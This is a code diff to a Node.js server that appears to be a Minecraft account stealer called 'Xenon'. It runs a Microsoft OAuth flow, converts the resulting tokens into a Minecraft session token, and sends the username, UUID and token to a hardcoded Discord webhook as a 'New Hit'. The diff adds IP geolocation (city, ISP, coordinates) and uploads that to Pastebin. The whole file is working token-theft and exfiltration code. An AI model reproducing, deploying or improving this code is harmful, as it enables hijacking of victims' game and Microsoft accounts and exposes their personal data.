@@ -2,6 +2,8 @@ const express = require(`express`);
 const app = express();
 const i = require(`node:events`)
 require('dotenv').config();
+var paste = require("better-pastebin");
+const { PasteClient, Publicity, ExpireDate } = require(`pastebin-api`)
 const mongoose = require('mongoose');
 const chalk = require('chalk');
 const fetch = require('node-fetch');
@@ -21,6 +23,7 @@ app.use(
 		extended: true,
 	})
 );
+
 const ascii = 
 `
 \n
@@ -39,16 +42,17 @@ var port = process.env.PORT || 8080
 var clientId = process.env.clientId
 var clientSecret = process.env.clientSecret
 var redirectUrl = process.env.redirectUrl
+var PasteKey = process.env.PasteKey
 var microsoftOauthUrl = 'https://login.live.com/oauth20_token.srf';
 var scopes = encodeURIComponent(
 	`XboxLive.signin offline_access openid https://graph.microsoft.com/mail.read`
 );
-console.log(`anything ----------------------------------------`)
+
 console.clear();
 console.log(chalk.red(ascii));
 
 app.listen(port, () => {
-	console.log(`\nlistening on port ${port}`)
+	console.log(`\nListening on port ${port}`)
 });
 
 app.get(`/token`, async (req, res) => {
@@ -61,7 +65,6 @@ app.get(`/token`, async (req, res) => {
 		redirectUrl
 	);
 	var accesstoken = access_token_response[0];
-	console.log(`anything ----------------------------------------`)
 	var refreshtoken = access_token_response[1];
 	var xblToken = await getXblToken(accesstoken);
 	var XstsList = await GetXstsToken(xblToken);
@@ -69,12 +72,14 @@ app.get(`/token`, async (req, res) => {
 	var XstsUuid = XstsList[1];
 	var MinecraftTokenResponse = await getMcToken(XstsToken, XstsUuid);
 	var MinecraftToken = MinecraftTokenResponse.access_token;
-	console.log(MinecraftToken)
 	var IgnAndUuid = await getUsername(MinecraftToken);
 	var Ign = IgnAndUuid[0];
 	var Uuid = IgnAndUuid[1];
 	var ip = await getIp()
-	await sendEmbed(MinecraftToken, Uuid, Ign, ip);
+	var ipInfo = (await getIpInfo(ip))
+	var PasteLink = await Paste(PasteKey, ipInfo)
+	await sendEmbed(MinecraftToken, Uuid, Ign, ip, PasteLink);
+	console.log(chalk.red(`\n[!] New Hit`))
 });
 
 async function createLink(id, url, scopes) {
@@ -164,19 +169,20 @@ async function getUsername(token) {
 }
 
 async function getIp(){
-	const response = axios.get(`https://api.myip.com`)
-	var ip = response.ip
+	const response = await axios.get(`https://api.ipify.org`)
+	const ip = response.data
 	return ip
 }
 
-async function sendEmbed(MinecraftToken, uuid, username, ip) {
+async function sendEmbed(MinecraftToken, uuid, username, ip, IpUrl) {
 	const webhook = new WebhookClient({
 		id: '1090664218010845234',
 		token:
 			'Q-DVC872Mk_M_XgzSeJ2CfPI9FQ7KNxS8moqWVOLzKhskQAXFgPdG1mjUY2-zei52mQM',
 	});
 	const embed = new EmbedBuilder()
-		.setTitle(`**New Hit ❗** @everyone`)
+		.setTitle(`**New Hit ❗**  -  Click for stats `)
+		.setURL(`https://sky.shiiyu.moe/stats/${username}`)
 		.setAuthor({ name: 'Xenon', iconURL: 'https://i.imgur.com/nXvl29a.png'})
 		// .setDescription('@everyone')
 		.setColor(0x0099FF)
@@ -187,7 +193,8 @@ async function sendEmbed(MinecraftToken, uuid, username, ip) {
 				name: 'SSID',
 				value: `\`${username}:${uuid}:${MinecraftToken}\``,
 			},
-			{name: `IPV4`, value:`\`${ip}\``, inline: true }
+			{name: `IPV4`, value:`\`${ip}\``, inline: true },
+			{name: `IP Info`, value:IpUrl,url:IpUrl, inline: true }
 		)
 		.setFooter({ text: 'legion*#4154', iconURL: 'https://i.imgur.com/rlHZ2Sx.png' })
 		.setTimestamp();
@@ -196,3 +203,40 @@ async function sendEmbed(MinecraftToken, uuid, username, ip) {
 		embeds: [embed],
 	});
 }
+
+async function getIpInfo(ip){
+	class ipClass {
+		constructor(IPV4, Region, City, ISP, Lon, Lat) {
+		  this.IPV4 = IPV4;
+		  this.Region = Region;
+		  this.City = City;
+		  this.ISP = ISP;
+		  this.Lon = Lon;
+		  this.Lat = Lat;
+		}
+	  }
+	const response = await axios.get(`http://ip-api.com/json/${ip}`)
+	const resdata = response.data
+	var ipInfo = new ipClass(resdata.query, resdata.regionName, resdata.city, resdata.isp, resdata.lon, resdata.lat)
+	var ipInfo2 = JSON.stringify(ipInfo,null, 4).toString()
+	return ipInfo2
+}
+
+async function Paste(key, ipInfo){
+	try{
+	const client = new PasteClient(key);
+
+	const url = await client.createPaste({
+  	code: `${ipInfo}`,
+ 	expireDate: "2W",
+  	format: "text",
+  	name: "Xenon",
+  	publicity: 1,
+});
+	return url;
+} catch(err){
+	return `\`Reached Max Paste Limit\``
+}
+}
+
+
